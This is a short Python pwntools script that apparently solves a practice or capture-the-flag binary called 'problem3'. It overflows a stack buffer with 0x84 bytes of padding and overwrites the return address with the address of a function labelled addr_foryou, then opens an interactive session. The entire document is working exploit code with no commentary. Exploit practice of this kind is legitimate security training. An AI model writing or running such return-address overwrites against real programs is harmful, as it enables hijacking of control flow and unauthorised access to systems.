from pwn  import *
import os
import sys
addr_foryou = 0x0000000000400566
p = process("./problem3")

payload = "a"*0x84
payload += p64(addr_foryou)
p.sendline(payload)

p.interactive()

print p.recv()